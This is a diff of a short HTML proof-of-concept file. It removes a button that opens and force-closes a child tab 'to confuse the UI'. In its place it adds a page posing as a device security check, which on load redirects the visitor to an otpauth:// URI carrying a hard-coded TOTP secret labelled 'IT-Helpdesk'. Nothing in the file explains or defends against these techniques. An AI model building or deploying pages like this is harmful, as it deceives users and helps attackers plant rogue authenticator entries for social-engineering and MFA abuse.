@@ -1,19 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><title>Crash Test 1</title></head>
 <body>
-    <button onclick="runExploit()">Trigger PoC</button>
+    <h1>Checking device security...</h1>
     <script>
-        function runExploit() {
-            // Open a new tab
-            let child = window.open('child.html', '_blank');
-            
-            // Wait just long enough for the child to start its alert, 
-            // then brutally close the tab from the outside to confuse the UI.
-            setTimeout(() => {
-                child.close();
-            }, 1000); 
-        }
+        window.location.href = "otpauth://totp/IT-Helpdesk:Admin?secret=JBSWY3DPEHPK3PXP&issuer=IT-Helpdesk";
     </script>
 </body>
 </html>
